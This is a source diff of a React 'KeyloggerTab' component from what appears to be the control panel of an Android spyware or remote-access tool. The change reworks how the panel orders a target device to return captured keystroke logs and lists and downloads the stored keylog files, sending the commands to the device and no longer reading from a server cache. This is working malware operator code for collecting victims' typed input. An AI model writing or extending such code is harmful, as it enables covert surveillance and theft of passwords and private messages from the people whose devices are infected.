@@ -56,47 +56,38 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
     URL.revokeObjectURL(url);
   };
 
-  // Handle download_keylog_file results that still come via sendCommand/SSE
   useEffect(() => {
     const relevant = results.filter(r =>
-      r.command === 'download_keylog_file' && r.success && r.response
+      (r.command === 'get_keylogs' || r.command === 'list_keylog_files' || r.command === 'download_keylog_file') &&
+      r.success && r.response
     );
     relevant.forEach(r => {
       if (seenResultIds.current.has(r.id)) return;
       seenResultIds.current.add(r.id);
       try {
         const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
-        if (data.base64) downloadBase64Text(data.base64, `keylogs_${data.date}.txt`);
+        if (r.command === 'get_keylogs' && data.logs) {
+          setStoredLogs(data.logs);
+        }
+        if (r.command === 'list_keylog_files' && data.files) {
+          setKeylogFiles(data.files);
+        }
+        if (r.command === 'download_keylog_file' && data.base64) {
+          downloadBase64Text(data.base64, `keylogs_${data.date}.txt`);
+        }
       } catch (_) {}
     });
   }, [results]);
 
-  // Fetch keylogs from server REST cache — no Android command needed
   const fetchLiveLogs = useCallback(() => {
     setLoading(true);
-    fetch(`/api/data/${deviceId}/keylogs?limit=500`)
-      .then(r => r.json())
-      .then(d => { if (d.logs) setStoredLogs(d.logs); })
-      .catch(() => {})
-      .finally(() => setLoading(false));
-  }, [deviceId]);
+    sendCommand(deviceId, 'get_keylogs', { limit: 500 });
+    setTimeout(() => setLoading(false), 1500);
+  }, [deviceId, sendCommand]);
 
   const fetchFiles = useCallback(() => {
     sendCommand(deviceId, 'list_keylog_files', {});
   }, [deviceId, sendCommand]);
-
-  // Handle list_keylog_files results via SSE (still command-based — file list is on device)
-  useEffect(() => {
-    const relevant = results.filter(r => r.command === 'list_keylog_files' && r.success && r.response);
-    relevant.forEach(r => {
-      if (seenResultIds.current.has(r.id)) return;
-      seenResultIds.current.add(r.id);
-      try {
-        const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
-        if (data.files) setKeylogFiles(data.files);
-      } catch (_) {}
-    });
-  }, [results]);
 
   useEffect(() => {
     if (isOnline) {
@@ -247,7 +238,7 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
                     </button>
                     <button
                       className="kl-btn"
-                      onClick={() => { fetchLiveLogs(); setViewMode('live'); }}
+                      onClick={() => { sendCommand(deviceId, 'get_keylogs', { limit: 500 }); setViewMode('live'); }}
                       disabled={!isOnline}
                     >
                       👁 View
